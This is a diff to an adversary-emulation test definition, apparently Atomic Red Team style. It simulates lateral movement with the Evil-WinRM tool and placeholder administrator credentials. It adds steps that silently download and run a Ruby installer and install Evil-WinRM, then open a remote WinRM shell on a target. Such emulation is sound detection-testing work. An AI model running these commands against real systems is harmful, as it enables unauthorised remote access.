@@ -2,15 +2,15 @@ api_version: "2.0"
 name: WinRM Access with Evil-WinRM
 description: An adversary may attempt to use Evil-WinRM with a valid account to interact with remote systems that have WinRM enabled
 args:
+    - name: user_name
+      type: string
+      default: Domain\Administrator
     - name: destination_address
       type: string
       default: Target
     - name: password
       type: string
       default: P@ssw0rd1
-    - name: user_name
-      type: string
-      default: Domain\Administrator
 uuid: efe86d95-44c4-4509-ae42-7bfd9d1f5b3d
 mitre:
     tactics:
@@ -23,6 +23,16 @@ requirements:
     platforms:
         - os: windows
 steps:
+    - name: Computer must have Ruby Installed
+      inline: |-
+        try {if (ruby -v) {exit 0} else {{New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
+        Invoke-WebRequest  -OutFile "PathToAtomicsFolder\..\ExternalPayloads\rubyinstaller-2.7.1-1-x64.exe" https://github.com/oneclick/rubyinstaller2/releases/download/RubyInstaller-2.7.1-1/rubyinstaller-2.7.1-1-x64.exe
+        $file1= "PathToAtomicsFolder\..\ExternalPayloads\rubyinstaller-2.7.1-1-x64.exe"
+        Start-Process $file1 /S;}}} catch {exit 1}
+      executor: powershell
+    - name: Computer must have Evil-WinRM installed
+      inline: try {if (evil-winrm -h) {exit 0} else {{gem install evil-winrm}}} catch {exit 1}
+      executor: powershell
     - name: winrm-access-with-evil-winrm
       inline: evil-winrm -i {{.Args.destination_address}} -u {{.Args.user_name}} -p {{.Args.password}}
       executor: powershell
